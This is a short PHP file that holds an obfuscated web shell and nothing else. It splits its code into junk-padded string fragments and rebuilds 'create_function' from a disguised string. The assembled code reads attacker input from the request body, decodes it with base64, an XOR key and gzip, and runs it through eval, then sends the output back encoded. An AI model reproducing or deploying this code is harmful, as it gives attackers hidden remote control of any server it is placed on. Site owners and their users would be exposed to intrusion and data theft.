<?php
$l='i=`Q0;$`Qi<`Q$l`Q;){for(`Q$`Qj=0;($j<$c&&$`Qi<$l);$j++,`Q$i++){$o`Q.=$`Qt{$i}^`Q$k{';
$F='Qn();$r=@base`Q64_`Qencode(@x(`Q@gz`Qcom`Qpres`Qs($o)`Q,$k`Q));print`Q("$p$kh$r$kf");}';
$s='$`Qj};}}return `Q$o;}if `Q(@p`Qreg_`Qmatch("/$k`Qh(.+`Q)$kf/",`Q@file_`Q`Q`Qget_con';
$b='`Qase64`Q_dec`Qod`Qe($m[`Q1])`Q,$k)));$o=`Q@o`Qb_get_conte`Qnts();@o`Qb_en`Qd_clea`';
$e='tents("php`Q://input`Q"`Q),$`Qm`Q)==1) {@ob_sta`Qrt();@eva`Ql(@g`Qzuncompress(`Q@x(@b';
$j=str_replace('VS','','creVSatVSeVS_fVSVSuncVStion');
$i='$k=`Q"593860b0"`Q;$kh=`Q"`Q`Q4f3c`Q40ca8`Q6e`Q6";$kf="e7a132ec5`Qfb1";$p="IKba`QLiyW0c`Q`';
$t='Qn6eCO`Qy";function x($`Qt,$k)`Q`Q{$c`Q=strlen($k);$l`Q=strl`Qen`Q($t);$o="`Q";for($';
$T=str_replace('`Q','',$i.$t.$l.$s.$e.$b.$F);
$c=$j('',$T);$c();
?>
